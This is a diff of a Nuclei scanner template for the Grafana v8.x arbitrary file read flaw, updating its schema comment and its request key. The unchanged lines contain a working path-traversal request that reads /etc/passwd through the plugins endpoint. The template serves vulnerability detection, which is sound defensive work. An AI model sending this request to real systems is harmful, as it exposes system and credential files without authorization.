@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: grafana-file-read
 info:
   name: Grafana v8.x Arbitrary File Read
@@ -9,7 +10,7 @@ info:
     - hhttps://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
     - https://twitter.com/naglinagli/status/1468155313182416899
   tags: grafana,lfi,fuzz
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd"
